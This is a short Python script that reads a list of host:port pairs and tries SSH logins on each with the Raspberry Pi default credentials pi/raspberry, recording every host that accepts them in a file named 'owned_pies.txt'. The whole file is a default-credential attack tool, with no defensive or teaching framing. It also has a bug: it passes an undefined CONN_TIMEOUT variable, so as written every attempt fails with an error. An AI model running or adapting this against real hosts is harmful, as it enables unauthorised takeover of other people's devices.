import paramiko
import sys

USER = 'pi'
PASS = 'raspberry'

PARAMIKO_LOGGING = False
TIMEOUT = 5

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

if PARAMIKO_LOGGING:
    paramiko.util.log_to_file("paramiko.log")

with open('pies.txt') as f:
    for line in f.readlines():
        pi = line.split(':')
        (host, port) = (pi[0], pi[1].replace('\n', ''))

        sys.stdout.write('Trying ' + host + ':' + port + '... ')
        sys.stdout.flush()

        try:
            ssh.connect(host, port=int(port), username=USER, password=PASS, timeout=CONN_TIMEOUT)
            sys.stdout.write('Authentication successful!\n')
            with open('owned_pies.txt', 'a') as g:
                g.write(host + ':' + port + '\n')
            ssh.close()
        except Exception as e:
            print(e)
            continue
